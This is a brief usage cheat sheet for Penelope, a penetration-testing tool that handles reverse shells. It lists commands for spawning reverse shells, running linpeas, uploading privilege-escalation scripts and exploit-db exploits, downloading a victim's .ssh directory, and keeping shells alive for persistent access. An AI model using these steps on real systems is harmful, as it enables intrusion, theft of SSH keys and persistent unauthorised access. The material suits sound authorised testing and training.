# Penelope

Link: https://github.com/brightio/penelope

## Usage

#### 1) Create listener

    penelope (Default 4444)

#### 2) Create listener on a specific port

    penelope 443

#### 3) Go to main menu of penelope

    CTRL+C or F12

## Penelope Terminal

#### 1) Run linpeas

    > run peass_ng

#### 2) Check for tasks running on the machine

    > tasks

#### 3) Spawn a reverse shell

    > spawn 443

#### 4) Upload privesc scripts to target machine

    > run upload_privesc_scripts

#### 5) Upload your own scripts on the machine

    > upload /home/user/myscripts

#### 6) Download an exploit from exploit-db

    > upload https://www.exploit-db.com/exploits/NUM

#### 7) Interact with your session

    > interact

#### 8) Open a file from target machine

    > open file.ods

#### 9) Download files 

    > download /home/victim/.ssh

#### 10) Maintain shells depending on the number provided for persistent access

    > maintaining 2

#### 11) Kill your session (If you maintained another shell session, upon killing one session, the tool will try to spawn another one)

    > kill
